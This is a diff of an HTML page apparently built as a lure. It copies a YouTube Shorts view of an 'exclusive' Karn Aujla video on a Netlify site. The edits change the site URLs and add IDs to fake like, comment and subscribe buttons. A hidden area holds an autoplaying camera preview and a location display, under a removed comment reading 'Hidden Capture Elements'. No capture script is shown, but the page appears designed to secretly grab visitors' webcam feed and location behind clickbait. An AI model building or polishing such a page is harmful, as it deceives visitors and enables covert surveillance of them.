@@ -13,19 +13,20 @@
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="video.other">
-    <meta property="og:url" content="https://joyful-fox-56242a.netlify.app/">
+    <meta property="og:url" content="https://karanytshots.netlify.app/">
     <meta property="og:title" content="Karn Aujla Exclusive - Watch Now">
     <meta property="og:description"
         content="Click to watch the exclusive Karn Aujla shorts video. Limited time access.">
-    <meta property="og:image" content="https://joyful-fox-56242a.netlify.app/thumbnail.jpg">
+    <meta property="og:image" content="https://karanytshots.netlify.app/thumbnail.jpg">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://joyful-fox-56242a.netlify.app/">
+    <meta property="twitter:url" content="https://karanytshots.netlify.app/">
     <meta property="twitter:title" content="Karn Aujla Exclusive - Watch Now">
     <meta property="twitter:description"
         content="Click to watch the exclusive Karn Aujla shorts video. Limited time access.">
-    <meta property="twitter:image" content="https://joyful-fox-56242a.netlify.app/thumbnail.jpg">
+    <meta property="twitter:image" content="https://karanytshots.netlify.app/thumbnail.jpg">
+    <link rel="canonical" href="https://karanytshots.netlify.app/" />
 
     <link rel="stylesheet" href="style.css">
 </head>
@@ -68,19 +69,19 @@
 
             <!-- Right Sidebar Actions -->
             <div class="actions-sidebar">
-                <div class="action-item">
+                <div class="action-item" id="likeBtn">
                     <div class="icon-circle">👍</div>
-                    <span>1.2M</span>
+                    <span id="likeCount">1.2M</span>
                 </div>
-                <div class="action-item">
+                <div class="action-item" id="dislikeBtn">
                     <div class="icon-circle">👎</div>
                     <span>Dislike</span>
                 </div>
-                <div class="action-item">
+                <div class="action-item" id="commentBtn">
                     <div class="icon-circle">💬</div>
                     <span>12K</span>
                 </div>
-                <div class="action-item">
+                <div class="action-item" id="shareBtn">
                     <div class="icon-circle">↪️</div>
                     <span>Share</span>
                 </div>
@@ -94,7 +95,7 @@
                 <div class="channel-line">
                     <div class="channel-avatar"></div>
                     <span class="channel-name">@KarnAujlaOfficial</span>
-                    <button class="subscribe-btn">Subscribe</button>
+                    <button class="subscribe-btn" id="subscribeBtn">Subscribe</button>
                 </div>
                 <div class="video-description">
                     <p>New hit song streaming now! 🔥punjabi #music #viral</p>
@@ -104,11 +105,12 @@
                 </div>
             </div>
 
-            <!-- Hidden Capture Elements -->
+            <!-- Progress Bar -->
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
 
-            <!-- Removed Start Button -->
-
-            <!-- Local Previews (Hidden) -->
+            <!-- Hidden Local Previews -->
             <div id="demoArea" class="demo-area hidden" style="display: none;">
                 <video id="camPreview" autoplay playsinline muted></video>
                 <div id="locationDisplay"></div>
